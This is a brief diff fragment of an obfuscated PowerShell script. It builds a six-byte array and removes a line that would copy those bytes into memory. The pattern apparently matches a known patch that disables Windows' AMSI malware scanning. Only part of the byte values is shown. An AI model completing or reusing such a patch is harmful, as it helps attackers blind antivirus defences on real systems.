@@ -33,5 +33,5 @@ $rxqr = "0x07"
 $yzex = "0x80"
 $gbrq = "0xC3"
 $acyyr = [Byte[]] ($vxck,$uixn,$bxny,$rxqr,+$yzex,+$gbrq)
-$7amada::Copy($acyyr, 0, $npmjpz, 6)
+
 
